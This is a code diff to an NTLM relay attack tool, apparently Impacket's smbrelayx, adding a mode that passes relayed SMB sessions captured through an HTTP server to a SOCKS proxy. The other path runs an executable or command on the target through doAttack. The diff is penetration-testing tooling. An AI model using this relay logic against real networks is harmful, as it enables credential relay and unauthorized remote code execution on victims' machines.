@@ -446,7 +446,7 @@ class SMBClient(SMB):
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile,
-                     one_shot, returnStatus=STATUS_SUCCESS):
+                     one_shot, returnStatus=STATUS_SUCCESS, runSocks = False):
             self.target = target
             self.exeFile = exeFile
             self.command = command
@@ -454,6 +454,7 @@ class HTTPRelayServer(Thread):
             self.returnStatus = returnStatus
             self.outputFile = outputFile
             self.one_shot = one_shot
+            self.runSocks = runSocks
 
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
@@ -584,9 +585,15 @@ class HTTPRelayServer(Thread):
                     global ATTACKED_HOSTS
                     if self.target not in ATTACKED_HOSTS:
                         ATTACKED_HOSTS.add(self.target)
-                        clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
-                        self.client = None
-                        clientThread.start()
+                        if self.server.runSocks is True:
+                            # Pass all the data to the socksplugins proxy
+                            activeConnections.put(
+                                (self.target, 445, authenticateMessage['user_name'], self.client, {'CHALLENGE_MESSAGE': self.challengeMessage}))
+                            logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
+                        else:
+                            clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
+                            self.client = None
+                            clientThread.start()
                     else:
                         logging.error('%s is being attacker at the moment, skipping.. ' % self.target)
 
@@ -610,6 +617,7 @@ class HTTPRelayServer(Thread):
         self.mode = None
         self.outputFile = outputFile
         self.one_shot = False
+        self.runSocks = False
 
     def setTargets(self, target):
         self.target = target
@@ -639,7 +647,7 @@ class HTTPRelayServer(Thread):
     def run(self):
         logging.info("Setting up HTTP Server")
         httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode,
-                                self.outputFile, self.one_shot)
+                                self.outputFile, self.one_shot, runSocks = self.runSocks)
         httpd.serve_forever()
 
 class SMBRelayServer(Thread):
@@ -1134,12 +1142,15 @@ if __name__ == '__main__':
     Command = options.c
     returnStatus = options.s
 
+    threads = set()
+
     if options.socks is True:
         # Start a SOCKS proxy in the background
-        s = SOCKS()
-        socks_thread = Thread(target=s.serve_forever)
+        s1 = SOCKS()
+        socks_thread = Thread(target=s1.serve_forever)
         socks_thread.daemon = True
         socks_thread.start()
+        threads.add(socks_thread)
 
     for server in RELAY_SERVERS:
         s = server(options.outputfile)
@@ -1156,6 +1167,7 @@ if __name__ == '__main__':
             sys.exit(1)
 
         s.start()
+        threads.add(s)
         
     print ""
     logging.info("Servers started, waiting for connections")
@@ -1163,6 +1175,11 @@ if __name__ == '__main__':
         try:
             sys.stdin.read()
         except KeyboardInterrupt:
+            logging.info('Quitting.. please wait')
+            if options.socks is True:
+                s1.shutdown()
+            for s in threads:
+                del(s)
             sys.exit(1)
         else:
             pass
